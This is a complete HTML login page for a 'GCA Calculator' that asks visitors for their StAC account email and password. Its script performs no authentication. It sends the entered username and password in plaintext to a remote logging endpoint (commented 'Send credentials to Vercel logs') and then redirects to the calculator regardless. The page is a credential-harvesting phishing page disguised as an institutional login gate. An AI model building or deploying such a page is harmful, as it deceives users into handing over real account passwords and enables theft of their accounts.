<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Login | GCA Calculator</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      background: linear-gradient(160deg, #0f172a 0%, #1e293b 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Inter", sans-serif;
      color: #f3f4f6;
    }
    .card {
      background: #161b22;
      padding: 32px;
      border-radius: 16px;
      text-align: center;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 10px;
      border: 1px solid #2d3748;
      background: #0f172a;
      color: #f3f4f6;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 10px;
      background: #3b82f6;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 12px;
    }
    button:hover { background: #2563eb; }
  </style>
</head>
<body>

  <div class="card">
    <h1>Welcome to the GCA Calculator!</h1>
    <p>Please log in with your StAC account to access the calculator. This is to ensure it stays within StAC.</p>
    <form id="loginForm">
      <input type="email" id="username" placeholder="Email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();

  // Get the entered values
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // Send credentials to Vercel logs
  fetch("https://gca-calc.vercel.app/api/log", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password })
  })
  .then(res => res.json())
  .then(data => console.log("Server response:", data))
  .catch(err => console.error(err));

  // Redirect to the calculator page
  window.location.href = 'calculator.html';
});
</script>

</body>
</html>
